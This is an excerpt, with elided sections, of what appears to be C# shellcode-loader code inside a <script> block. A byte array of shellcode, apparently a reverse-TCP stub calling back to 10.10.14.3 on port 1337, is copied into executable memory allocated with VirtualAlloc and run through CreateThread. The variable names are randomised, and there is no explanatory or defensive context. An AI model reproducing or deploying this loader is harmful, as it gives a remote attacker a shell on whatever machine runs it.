...
0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x01,
0x68,0x0a,0x0a,0x0e,0x03,0x68,0x02,0x00,0x05,0x39,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr qGhspHnL = VirtualAlloc(IntPtr.Zero,(UIntPtr)lhNvI0wJ.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(lhNvI0wJ,0,qGhspHnL,lhNvI0wJ.Length);
        IntPtr ijpn63 = IntPtr.Zero;
        IntPtr zHkYKuYMuK = CreateThread(IntPtr.Zero,UIntPtr.Zero,qGhspHnL,IntPtr.Zero,0,ref ijpn63);
    }
</script>
